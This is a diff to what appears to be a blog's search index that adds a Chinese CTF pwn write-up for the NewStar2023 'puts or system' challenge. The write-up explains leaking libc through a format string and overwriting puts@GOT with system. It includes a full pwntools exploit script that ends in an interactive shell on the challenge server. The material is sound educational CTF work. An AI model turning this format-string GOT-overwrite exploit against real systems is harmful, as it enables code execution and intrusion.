@@ -83,6 +83,31 @@
   
   
   <entry>
+    <title>格式化字符串修改got表</title>
+    <link href="/2023/11/27/ctf-pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2gots%E8%A1%A8%E5%9C%B0%E5%9D%80/"/>
+    <url>/2023/11/27/ctf-pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2gots%E8%A1%A8%E5%9C%B0%E5%9D%80/</url>
+    
+    <content type="html"><![CDATA[<h3 id="NewStar2023-puts-or-system"><a href="#NewStar2023-puts-or-system" class="headerlink" title="NewStar2023 puts or system"></a>NewStar2023 puts or system</h3><p><a href="https://buuoj.cn/match/matches/190/challenges">https://buuoj.cn/match/matches/190/challenges</a></p><p>通过%s泄露libc</p><p>目的是通过<code>b&#39;a&#39; * 4 + b&#39;%?$s&#39; + p64(puts_got)</code>把puts_got当成字符串的地址，打印got表项</p><p>4个a和<code>%?$s</code>加起来正好是8个字节。</p><p>在获取是第几个%s的时候，由于不能像%p那样一直%s%s%s%s…..，因为%s如果作为地址取内容失败会崩溃</p><p>所以在第一次试的时候就要用 <code>&#39;a&#39; * 8 + &#39;b&#39; * 8</code> （8个a代表原本的4个a和%?$s，8个b代表puts的got表地址），然后再加上%p%p%p%p%p%p%p%p……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./putsorsys&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27515</span>)<br>elf = ELF(<span class="hljs-string">&#x27;putsorsys&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>offset = <span class="hljs-number">8</span><br>p.sendlineafter(<span class="hljs-string">&quot;(0/1)\n&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + <span class="hljs-string">b&#x27;%9$s&#x27;</span> + p64(puts_got)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>] <br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>] <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(sys_addr))<br><br>p.sendlineafter(<span class="hljs-string">&quot;(0/1)\n&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>fmtpayload = fmtstr_payload(offset, &#123;puts_got:sys_addr&#125;)<br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s it\n&quot;</span>,fmtpayload)<br>p.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf-pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf-pwn</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>PIE Format String</title>
     <link href="/2023/11/26/ctf-pwn/PIE%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
     <url>/2023/11/26/ctf-pwn/PIE%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
